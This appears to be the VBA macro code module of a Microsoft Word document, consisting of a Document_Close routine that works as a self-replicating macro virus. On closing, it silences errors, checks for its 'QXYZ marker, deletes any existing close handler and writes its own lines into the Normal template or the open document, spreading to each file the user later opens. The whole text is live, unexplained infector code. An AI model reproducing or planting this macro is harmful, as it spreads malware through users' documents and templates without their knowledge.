   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   'QXYZ
   Dim linex As New Collection
   On Error Resume Next
   If MacroContainer Is NormalTemplate Then
   Set t = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
   ElseIf MacroContainer Is ActiveDocument Then
   Set t = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
   Else
   t = ""
   End If
   If t <> "" And Not isme Then
   isme = False: For i = 1 To t.CountOfLines: If t.lines(i, 1) = "'QXYZ" Then isme = True
   Next
   f = 0: i = 1
   While f <> 2 And i <= t.CountOfLines
   If t.lines(i, 1) = "Private Sub Document_Close()" Then f = 1
   If f = 1 And t.lines(i, 1) = "End Sub" Then t.DeleteLines i, 1: i = i - 1: f = False: f = 2
   If f = 1 Then t.DeleteLines i, 1: i = i - 1
   i = i + 1
   Wend
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   linex.Add CStr(MacroContainer.VBProject.VBComponents.Item(1).CodeModule.lines(i, 1)), "L" & i
   Next
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   t.InsertLines i, linex("L" & i)
   Next
   End If
   End Sub
